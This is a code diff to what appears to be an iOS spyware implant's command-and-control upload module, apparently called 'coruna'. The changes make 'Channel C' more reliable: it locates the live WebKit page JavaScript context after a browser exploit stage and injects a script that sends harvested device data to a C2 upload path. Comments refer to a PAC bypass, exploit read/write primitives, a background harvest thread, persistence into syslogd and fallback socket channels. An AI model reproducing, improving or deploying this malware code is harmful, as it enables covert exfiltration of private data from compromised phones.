@@ -3,11 +3,11 @@
  *
  * Four upload channels, tried in order until one succeeds:
  *
- *   Channel C — JavaScriptCore context injection  [PRIMARY in WebContent]
- *     Obtains the live JSContext via [JSContext currentContext].
- *     Evaluates a sync XMLHttpRequest POST (same stack as loading dylib in page).
- *     A saved reference is also dispatched to the main queue from the
- *     background implant thread (dispatch_async, non-blocking).
+ *   Channel C — JavaScriptCore page VM injection  [PRIMARY in WebContent]
+ *     Resolves the live page JSContext via +[JSContext currentContext] and,
+ *     when that is nil (common after Stage .Pt() native edges), via
+ *     JSGlobalContextGetCurrent → +[JSContext contextWithJSGlobalContextRef:].
+ *     POST uses sync XMLHttpRequest with a same-origin relative URL (C2_UPLOAD).
  *
  *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY outside WC]
  *     Works outside WebContent (e.g. after persistence into syslogd).
@@ -30,7 +30,10 @@
  */
 
 #import <Foundation/Foundation.h>
+#import <JavaScriptCore/JavaScriptCore.h>
 #import <objc/message.h>
+#import <os/log.h>
+#include <dlfcn.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -93,18 +96,18 @@ static NSString *c2_safe_str(const char *s) {
  * Channel C — JavaScriptCore context injection
  * ═══════════════════════════════════════════════════════════════════════════
  *
- * When Stage3_VariantB.js calls _process() via a PAC-bypassed function
- * pointer, we execute on the JSC main thread while vm.topCallFrame is active.
- * [JSContext currentContext] returns the live JS context in this scenario.
+ * When Stage3_VariantB.js returns from .Pt(), native code may sit on a WebKit
+ * edge where +[JSContext currentContext] is nil even though the page VM is
+ * active — the VM TLS slot JSGlobalContextGetCurrent still points at the
+ * document context used for sync XHR GET of bootstrap.dylib.
  *
  * We inject a self-executing script with the JSON body base64-encoded (atob
  * in JS).  Sync XMLHttpRequest is used for POST (same path as Stage3 loading
  * bootstrap.dylib); it completes before evaluateScript returns, avoiding
  * fire-and-forget fetch() races with page teardown / PAC cleanup.
  *
- * A strong reference to the context is saved so that the background implant
- * thread (implant_main) can dispatch the same upload script to the main queue
- * without blocking harvest_all() on false positives (see upload_via_jsc_dispatch).
+ * A strong reference to the captured JSContext is saved so harvest can reuse
+ * the same wrapper (thread-unsafe; best-effort only off the VM thread).
  */
 
 /* Strong reference to the captured JSContext.  Set at most once (in process()
@@ -112,68 +115,147 @@ static NSString *c2_safe_str(const char *s) {
  * background dispatches can fire as long as the page is loaded. */
 static id g_saved_jsc = nil;
 
-/* Build JS that POSTs JSON via sync XMLHttpRequest — same _xhr idiom as Stage3 bootstrap load. */
-static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
-    NSString *b64body = [body base64EncodedStringWithOptions:0];
-    NSString *c2url   = [NSString stringWithFormat:@"%@://%s%s",
-                         C2_USE_HTTPS ? @"https" : @"http",
-                         C2_DOMAIN, C2_UPLOAD];
-    return [NSString stringWithFormat:
-        @"(function(){"
-        @"try{"
-        @"var _xhr=new XMLHttpRequest();"
-        @"_xhr.open('POST','%@',false);"
-        @"_xhr.setRequestHeader('Content-Type','application/json');"
-        @"_xhr.setRequestHeader('X-Device-UUID','%@');"
-        @"_xhr.send(atob('%@'));"
-        @"return _xhr.status>=200&&_xhr.status<300;"
-        @"}catch(e){return false;}"
-        @"})();",
-        c2url, uuid, b64body];
-}
-
-/* Read boolean result from evaluateScript: (JSValue) without linking JSC headers. */
-static bool jsc_eval_script_yields_true(id ctx, NSString *script) {
-    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
-    if (!ctx || !script || ![ctx respondsToSelector:evalSel]) return false;
-
-    id (*sendId)(id, SEL, id) = (id (*)(id, SEL, id))objc_msgSend;
-    id jsv = sendId(ctx, evalSel, script);
-    if (!jsv) return false;
-
-    SEL toBoolSel = NSSelectorFromString(@"toBool");
-    if (![jsv respondsToSelector:toBoolSel]) return false;
-
-    BOOL (*sendBool)(id, SEL) = (BOOL (*)(id, SEL))objc_msgSend;
-    return sendBool(jsv, toBoolSel) ? true : false;
+static os_log_t coruna_c2_log(void) {
+    static os_log_t lg;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ lg = os_log_create("com.coruna", "c2"); });
+    return lg;
 }
 
 /*
- * upload_via_jsc_now — must be called from the JS execution thread.
- *
- * Calls [JSContext currentContext]; if non-nil saves it globally and
- * evaluates the upload script (sync XHR runs to completion inside eval).
- * Returns true only if the script reports HTTP 2xx (avoids skipping B/A/D on failure).
+ * JSGlobalContextGetCurrent — VM TLS slot for the active page context.
+ * Survives many WebKit native call edges where +[JSContext currentContext] is nil
+ * (e.g. Stage3 .Pt() trampolines).  Documented for C API consumers; resolved
+ * dynamically so builds survive SDK header drift.
+ */
+static JSGlobalContextRef coruna_jsc_global_context_get_current(void) {
+    static JSGlobalContextRef (*fn)(void);
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        static const char *const names[] = {
+            "JSGlobalContextGetCurrent",
+            "_JSGlobalContextGetCurrent",
+        };
+        for (size_t i = 0; i < sizeof(names) / sizeof(names[0]) && !fn; i++)
+            fn = (JSGlobalContextRef (*)(void))dlsym(RTLD_DEFAULT, names[i]);
+    });
+    return fn ? fn() : NULL;
+}
+
+/** Prefer +currentContext; if nil, wrap VM TLS JSGlobalContextRef (WebKit page). */
+static id coruna_resolve_web_jscontext(bool *used_vm_tls) {
+    if (used_vm_tls)
+        *used_vm_tls = false;
+
+    Class cls = NSClassFromString(@"JSContext");
+    if (!cls)
+        return nil;
+
+    SEL curSel = NSSelectorFromString(@"currentContext");
+    if ([cls respondsToSelector:curSel]) {
+        id c = ((id (*)(id, SEL))objc_msgSend)(cls, curSel);
+        if (c)
+            return c;
+    }
+
+    JSGlobalContextRef ref = coruna_jsc_global_context_get_current();
+    if (!ref)
+        return nil;
+
+    SEL wrapSel = NSSelectorFromString(@"contextWithJSGlobalContextRef:");
+    if (![cls respondsToSelector:wrapSel])
+        return nil;
+
+    id c = ((id (*)(id, SEL, JSGlobalContextRef))objc_msgSend)(cls, wrapSel, ref);
+    if (c && used_vm_tls)
+        *used_vm_tls = true;
+    return c;
+}
+
+/*
+ * Same-origin POST (relative URL) — scheme/host/port always match the document
+ * that loaded payloads/bootstrap.dylib; avoids mismatches with macros vs proxy.
+ */
+static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
+    NSString *b64body = [body base64EncodedStringWithOptions:0];
+    return [NSString stringWithFormat:
+        @"(function(){"
+        @"try{"
+        @"var g=(typeof window!=='undefined'?window:self);"
+        @"var X=g.XMLHttpRequest;if(!X)return-1;"
+        @"var _xhr=new X();"
+        @"_xhr.open('POST','%s',false);"
+        @"_xhr.setRequestHeader('Content-Type','application/json');"
+        @"_xhr.setRequestHeader('X-Device-UUID','%@');"
+        @"_xhr.send(atob('%@'));"
+        @"return _xhr.status|0;"
+        @"}catch(e){return-2;}"
+        @"})();",
+        C2_UPLOAD, uuid, b64body];
+}
+
+static bool jsc_eval_http_upload_ok(id ctx, NSString *script) {
+    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    if (!ctx || !script || ![ctx respondsToSelector:evalSel])
+        return false;
+
+    id (*msgId)(id, SEL, id) = (id (*)(id, SEL, id))objc_msgSend;
+    id jsv = msgId(ctx, evalSel, script);
+    if (!jsv) {
+        os_log(coruna_c2_log(), "channel C: evaluateScript returned nil");
+        return false;
+    }
+
+    SEL toIntSel = NSSelectorFromString(@"toInt32");
+    if (![jsv respondsToSelector:toIntSel]) {
+        os_log(coruna_c2_log(), "channel C: JSValue lacks toInt32");
+        return false;
+    }
+
+    int32_t st = ((int32_t (*)(id, SEL))objc_msgSend)(jsv, toIntSel);
+    if (st == -1) {
+        os_log(coruna_c2_log(), "channel C: XMLHttpRequest missing (wrong global object)");
+        return false;
+    }
+    if (st == -2) {
+        os_log(coruna_c2_log(), "channel C: JS exception during XHR");
+        return false;
+    }
+    if (st < 0) {
+        os_log(coruna_c2_log(), "channel C: unexpected code %{public}d", st);
+        return false;
+    }
+
+    if (st < 200 || st >= 300) {
+        os_log(coruna_c2_log(), "channel C: HTTP %{public}d (want 2xx)", st);
+        return false;
+    }
+    return true;
+}
+
+/*
+ * upload_via_jsc_now — call while still on the WebKit / JSC thread that ran .Pt().
  */
 static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
-    Class jsCtxClass = NSClassFromString(@"JSContext");
-    if (!jsCtxClass) return false;
+    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    bool via_tls = false;
+    id ctx = coruna_resolve_web_jscontext(&via_tls);
+    if (!ctx || ![ctx respondsToSelector:evalSel]) {
+        os_log(coruna_c2_log(), "channel C: no JSContext (vmTLS=%{public}d)", via_tls ? 1 : 0);
+        return false;
+    }
 
-    SEL currentSel = NSSelectorFromString(@"currentContext");
-    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
-    if (![jsCtxClass respondsToSelector:currentSel]) return false;
-
-    id ctx = [jsCtxClass performSelector:currentSel];
-    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;
-
-    /* Save for background-thread reuse — only set once, before any thread
-     * could race here (called from process() before coruna_constructor()). */
-    if (!g_saved_jsc) g_saved_jsc = ctx;
+    if (!g_saved_jsc)
+        g_saved_jsc = ctx;
 
     NSString *script = jsc_xhr_script(body, uuid);
     @try {
-        return jsc_eval_script_yields_true(ctx, script);
+        bool ok = jsc_eval_http_upload_ok(ctx, script);
+        if (ok)
+            os_log(coruna_c2_log(), "channel C: upload ok (vmTLS=%{public}d)", via_tls ? 1 : 0);
+        return ok;
     } @catch (...) {
+        os_log(coruna_c2_log(), "channel C: ObjC exception in eval");
         return false;
     }
 }
@@ -181,7 +263,7 @@ static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
 /*
  * jsc_push_to_d2q — push base64-encoded JSON body to window.__d1_q[].
  *
- * Must be called from the JS execution thread (i.e. process() → upload_beacon()).
+ * Must be called from the WebKit JS thread (i.e. process() → upload_beacon()).
  * Stage3_VariantB.js reads window.__d1_q after _process() returns and POSTs
  * each item via XHR — WITHOUT using exploit primitives (read32/write32), so
  * it cannot corrupt the PAC-bypass state after Pt() returns.
@@ -190,21 +272,15 @@ static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
  * Returns false if no active JSContext is available (e.g. background thread).
  */
 static bool jsc_push_to_d2q(NSData *body) {
-    Class jsCtxClass = NSClassFromString(@"JSContext");
-    if (!jsCtxClass) return false;
-
-    SEL currentSel = NSSelectorFromString(@"currentContext");
-    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
-    if (![jsCtxClass respondsToSelector:currentSel]) return false;
-
-    id ctx = [jsCtxClass performSelector:currentSel];
-    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;
+    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    id ctx = coruna_resolve_web_jscontext(NULL);
+    if (!ctx || ![ctx respondsToSelector:evalSel])
+        return false;
 
     NSString *b64 = [body base64EncodedStringWithOptions:0];
-    if (!b64 || b64.length == 0) return false;
+    if (!b64 || b64.length == 0)
+        return false;
 
-    /* Base64 alphabet is [A-Za-z0-9+/=] — safe inside a JS single-quoted
-     * string literal with no escaping needed. */
     NSString *script = [NSString stringWithFormat:
         @"(window.__d1_q=window.__d1_q||[]).push('%@');", b64];
     [ctx performSelector:evalSel withObject:script];
@@ -212,38 +288,28 @@ static bool jsc_push_to_d2q(NSData *body) {
 }
 
 /*
- * upload_via_jsc_dispatch — safe to call from any thread.
+ * upload_via_jsc_dispatch — background implant path (off the VM thread).
  *
- * Runs the same XHR script on the main queue and returns whether HTTP 2xx
- * was observed.  Uses dispatch_sync when not already on main (avoids the
- * previous bug: dispatch_async + unconditional true skipped B/A/D).
- *
- * Note: WebKit may associate JSContext with the JS worker thread, not main;
- * this path is best-effort; failure falls through to B/A/D.
+ * JSContext is not thread-safe; evaluating on the harvest thread is undefined
+ * but frequently works for read-only XHR.  Deliberately avoid dispatch_get_main_queue
+ * here: WebKit's JS rarely runs on the UI/main thread in WebContent.
  */
 static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
     id ctx = g_saved_jsc;
-    if (!ctx) return false;
+    if (!ctx)
+        return false;
 
     SEL evalSel = NSSelectorFromString(@"evaluateScript:");
-    if (![ctx respondsToSelector:evalSel]) return false;
+    if (![ctx respondsToSelector:evalSel])
+        return false;
 
-    __strong id capturedCtx   = ctx;
-    NSString *capturedScript = jsc_xhr_script(body, uuid);
-
-    __block bool ok = false;
-    void (^work)(void) = ^{
-        @try {
-            ok = jsc_eval_script_yields_true(capturedCtx, capturedScript);
-        } @catch (...) {
-            ok = false;
-        }
-    };
-    if ([NSThread isMainThread])
-        work();
-    else
-        dispatch_sync(dispatch_get_main_queue(), work);
-    return ok;
+    NSString *script = jsc_xhr_script(body, uuid);
+    @try {
+        return jsc_eval_http_upload_ok(ctx, script);
+    } @catch (...) {
+        os_log(coruna_c2_log(), "channel C: background eval exception");
+        return false;
+    }
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════
@@ -440,7 +506,7 @@ static NSData *make_json_body(NSString *uuid, const char *category,
  *
  * Channel C (JSContext sync XHR injection):
  *   • On the JS thread (process() call):   upload_via_jsc_now()     [sync eval]
- *   • On a background thread (implant_main): upload_via_jsc_dispatch() [async]
+ *   • On a background thread (implant_main): upload_via_jsc_dispatch() — best-effort eval on saved ctx
  *   Uses WebKit's network stack from page JS (consistent with sync GET of dylib).
  *
  * Channel B (raw socket + TLS):
